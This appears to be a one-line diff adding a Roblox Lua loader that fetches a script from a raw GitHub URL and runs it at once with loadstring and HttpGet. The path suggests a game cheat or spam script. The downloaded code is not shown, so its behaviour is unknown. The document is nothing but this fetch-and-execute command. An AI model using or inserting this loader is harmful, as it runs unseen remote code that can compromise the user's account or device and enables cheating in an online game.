@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/shoot-for-eggs-spam2-eejm5a93g1n6yl.lua"))()
